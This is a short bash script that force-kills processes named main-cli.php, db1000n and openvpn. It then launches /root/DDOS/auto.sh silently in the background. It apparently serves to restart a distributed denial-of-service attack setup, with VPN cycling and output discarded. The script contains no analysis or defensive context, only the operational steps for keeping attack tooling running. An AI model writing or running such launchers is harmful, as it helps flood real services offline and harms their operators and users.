#!/bin/bash
sudo pkill -9 -f "main-cli.php"; sudo pkill -9 -f "db1000n"; sudo pkill -9 -f "openvpn";
nohup /root/DDOS/auto.sh > /dev/null 2>&1 & echo $!
